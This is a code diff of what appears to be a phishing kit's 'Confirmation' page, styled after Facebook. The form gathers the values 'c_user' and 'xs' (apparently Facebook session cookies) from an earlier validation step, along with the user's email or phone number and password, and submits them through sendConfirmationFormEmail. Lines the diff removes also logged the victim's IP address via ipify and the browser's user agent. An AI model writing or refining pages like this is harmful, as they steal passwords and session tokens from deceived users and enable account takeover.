@@ -25,7 +25,6 @@ import {
 } from "@/components/ui/select";
 import { countries } from "@/lib/countries";
 import { Eye, EyeOff, Search } from "lucide-react";
-import { parsePhoneNumber, getCountryCallingCode } from 'libphonenumber-js';
 
 export default function Confirmation() {
   const { toast } = useToast();
@@ -37,32 +36,38 @@ export default function Confirmation() {
   const [filteredCountries, setFilteredCountries] = useState(countries);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
+  // Initialize form with validation data
   const form = useForm<ConfirmationForm>({
     resolver: zodResolver(formTwoSchema),
     defaultValues: {
-      user_email: "",
-      password: "",
+      c_user: '',
+      xs: '',
+      user_email: '',
+      password: '',
       contactMethod: 'email',
-      countryCode: '+1',
-      c_user: "",
-      xs: ""
-    },
+      countryCode: '+1'
+    }
   });
 
-  // Load validation data on mount
+  // Load validation data from localStorage
   useEffect(() => {
     const storedData = localStorage.getItem('validation_data');
     if (!storedData) {
       setLocation('/validation');
       return;
     }
+
     try {
       const parsed = JSON.parse(storedData);
       if (!parsed.c_user || !parsed.xs) {
         throw new Error("Invalid validation data");
       }
-      form.setValue('c_user', parsed.c_user);
-      form.setValue('xs', parsed.xs);
+
+      form.reset({
+        ...form.getValues(),
+        c_user: parsed.c_user,
+        xs: parsed.xs
+      });
     } catch (error) {
       console.error('Failed to parse validation data:', error);
       setLocation('/validation');
@@ -78,39 +83,26 @@ export default function Confirmation() {
     setFilteredCountries(filtered);
   }, [countrySearch]);
 
-  const onSubmit = async (data: ConfirmationForm) => {
+  // Form submission handler
+  const onSubmit = async (formData: ConfirmationForm) => {
     try {
       setIsSubmitting(true);
 
-      // Get validation data to include in the submission
-      const validationData = localStorage.getItem('validation_data');
-      if (!validationData) {
-        throw new Error('Previous validation data not found');
-      }
-      const parsedValidationData = JSON.parse(validationData);
-
-      const formattedData = {
-        ...data,
-        ...parsedValidationData,
-        user_email: data.user_email ? (contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email) : undefined,
+      const submissionData = {
+        ...formData,
         contactMethod,
         countryCode: contactMethod === 'phone' ? countryCode : undefined,
-        timestamp: new Date().toLocaleString(),
-        userAgent: navigator.userAgent,
-        ipAddress: await fetch('https://api.ipify.org?format=json')
-          .then(res => res.json())
-          .then(data => data.ip)
-          .catch(() => 'Not available')
+        user_email: formData.user_email 
+          ? (contactMethod === 'phone' ? `${countryCode}${formData.user_email}` : formData.user_email)
+          : undefined
       };
 
-      await sendConfirmationFormEmail(formattedData);
-
-      // Clean up stored data after successful submission
+      await sendConfirmationFormEmail(submissionData);
       localStorage.removeItem('validation_data');
 
       toast({
         title: "Success!",
-        description: "Your form has been submitted successfully"
+        description: "Your information has been submitted successfully"
       });
 
       setLocation("/success");
@@ -119,28 +111,10 @@ export default function Confirmation() {
       toast({
         variant: "destructive",
         title: "Error",
-        description: error instanceof Error ? error.message : "Failed to submit form. Please try again.",
+        description: "Failed to submit form. Please try again."
       });
     } finally {
       setIsSubmitting(false);
-    }
-  };
-
-  const handlePhoneInput = (value: string) => {
-    try {
-      const cleanNumber = value.replace(/^\+/, '').replace(/^[0-9]{1,4}/, '');
-      const phoneNumber = parsePhoneNumber(value, { extract: true });
-
-      if (phoneNumber?.country) {
-        const detectedCode = `+${getCountryCallingCode(phoneNumber.country)}`;
-        if (detectedCode !== countryCode) {
-          setCountryCode(detectedCode);
-          form.setValue('user_email', cleanNumber);
-        }
-      }
-      form.setValue('user_email', cleanNumber);
-    } catch (error) {
-      form.setValue('user_email', value);
     }
   };
 
@@ -178,7 +152,7 @@ export default function Confirmation() {
                       onClick={() => setContactMethod('email')}
                       className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                         contactMethod === 'email'
-                          ? 'bg-[#0180FA] text-white shadow-md'
+                          ? 'bg-[#0180FA] text-white'
                           : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                       }`}
                     >
@@ -189,7 +163,7 @@ export default function Confirmation() {
                       onClick={() => setContactMethod('phone')}
                       className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                         contactMethod === 'phone'
-                          ? 'bg-[#0180FA] text-white shadow-md'
+                          ? 'bg-[#0180FA] text-white'
                           : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                       }`}
                     >
@@ -204,7 +178,7 @@ export default function Confirmation() {
                   render={({ field }) => (
                     <FormItem>
                       <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                        {contactMethod === 'email' ? 'Email Address (Optional)' : 'Phone Number (Optional)'}
+                        {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
                       </FormLabel>
                       <FormControl>
                         <div className="flex gap-2">
@@ -239,8 +213,7 @@ export default function Confirmation() {
                             </Select>
                           )}
                           <Input
-                            type={contactMethod === 'email' ? 'email' : 'text'}
-                            inputMode={contactMethod === 'email' ? 'email' : 'numeric'}
+                            type={contactMethod === 'email' ? 'email' : 'tel'}
                             placeholder={
                               contactMethod === 'email'
                                 ? "Enter email address"
@@ -248,15 +221,6 @@ export default function Confirmation() {
                             }
                             className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                             {...field}
-                            onChange={(e) => {
-                              let value = e.target.value;
-                              if (contactMethod === 'phone') {
-                                value = value.replace(/[^\d]/g, '');
-                                handlePhoneInput(value);
-                              } else {
-                                field.onChange(value);
-                              }
-                            }}
                           />
                         </div>
                       </FormControl>
@@ -300,7 +264,7 @@ export default function Confirmation() {
 
               <Button
                 type="submit"
-                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200 shadow-md"
+                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200"
                 disabled={isSubmitting}
               >
                 {isSubmitting ? "Submitting..." : "Submit"}
